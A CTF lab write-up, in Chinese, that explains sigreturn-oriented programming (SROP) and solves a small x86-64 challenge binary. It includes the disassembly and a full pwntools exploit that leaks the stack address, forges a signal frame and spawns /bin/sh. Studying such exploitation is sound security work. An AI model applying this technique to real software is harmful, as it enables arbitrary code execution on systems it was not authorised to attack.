---
title: LYS SROP lab WriteUp
date: 2024-08-20 16:55:54
category: PWN
tags: 
  - ctf
  - pwn
excerpt: ROP | SROP | rt_sigreturn
---

> srop (signal return oriented program)

## Signal

當接收到一個sinal信號

1. kernel 會把上下文 ( 各種暫存器 ) 保留到 stack 上，叫做 Signal Frame
2. kernal 將進程的控制流轉移到用戶定義的信號處理程序（signal handler）。這個處理程序是**用戶程式**中指定的一段代碼，用來處理特定的信號。
3. 信號處理程序執行用戶定義的操作，如打印消息、清理資源、或者修改某些全局狀態 and ret。
4. 當信號處理程序結束後，控制流會跳轉到一個名為 `__restore_rt` 的函數。這個函數內部會執行一個特定的系統調用指令：

    ```asm
    mov rax, 0xf  ; 將系統調用號 0xf (sys_rt_sigreturn) 放入 RAX 寄存器
    syscall       ; 呼叫系統調用，進入內核模式
    ```

5. 上面這個function會call `sys_rt_sigreturn` 從stack中提取出之前保存的 Signal Frame，並恢復上下文，包括所有暫存器的值。 process 將繼續從原來中斷的位置執行。

## Srop

rop 需要設定每一個rigister的值
這時候在 stack 上擺好 Signal Frame，然後呼叫 sys_rt_sigreturn syscall，利用srop就可以一次設定好全部的rigster

優點：效率高，簡化rop chain
缺點：需要較大的stack空間

### `rt_sigreturn`

一樣用前面xor的手法把rax設定成 0xf， `mov rax, 0xf; syscall` ，他就會 call 到 `rt_sigreturn`

>find 0xf in [syscall](https://x64.syscall.sh/)

## LYS lab_srop

基本原理：在Linux中，信號處理過程中使用了一個名為sigreturn的系統調用，它會從堆疊中恢復寄存器的狀態。當一個信號處理程序結束時，系統會自動調用 sigreturn 來恢復程式的執行狀態。

```bash
root@localhost:~/pwn/srop# objdump -d -M intel srop

srop:     file format elf64-x86-64


Disassembly of section .text:

0000000000401000 <.text>:
  401000:       48 31 c0                xor    rax,rax
  401003:       ba 00 04 00 00          mov    edx,0x400
  401008:       48 89 e6                mov    rsi,rsp
  40100b:       48 89 c7                mov    rdi,rax
  40100e:       0f 05                   syscall 
  401010:       c3                      ret    
```

![image](/images/srop-syscall2.png)

> 依照syscall表知道`*buf`指向 `rsp`

## set rax

![image](/images/srop-setrax.png)

透過蓋回`x/03`設定 `rax` 成1，後就可以write出rsp的內容，總共 0x400

### stack frame

最後照 lys 簡報填上，
![Alt text](/images/srop_frame.png)

### Exploit

> 遠端關了，本地要開tmux

```python
from pwn import *
import warnings
import time

warnings.filterwarnings("ignore", category=BytesWarning)

context.arch = 'amd64'
# context.terminal = ['tmux', 'splitw', '-h']

r = process("./srop")

# 輸入會填進rsi

p = flat(0x401000,0x401003,0x401000)

# gdb.attach(r)

r.sendline(p)
time.sleep(1)

r.send(b'\x03')

# gdb.attach(r)

r.recv(0x240)

rsp = u64(r.recv(8)) - 0x281
success("rsp -> %s", hex(rsp)) 
r.recv()

p2 = flat(
    0x401000,0x40100e,
    [0]*13,
    rsp+272, # rdi -> '/bin/sh'
    [0]*4,  # rsi,rbp,rbx,rdx
    0x3b,   # rax
    0x0,0,
    0x40100e,
    0,
    0x33,
    [0]*8
)

print(len(p2))
p2 += b'/bin/sh\x00'

r.send(p2)
time.sleep(1)
r.send(p2[8:][:15])

r.interactive()
```

### REF

[kazma.tw LYS-Rop-lab-srop-Writeup](https://kazma.tw/2024/08/05/LYS-Rop-lab-srop-Writeup/)
[oalieno.tw srop](https://oalieno.tw/2019/09/18/srop/)
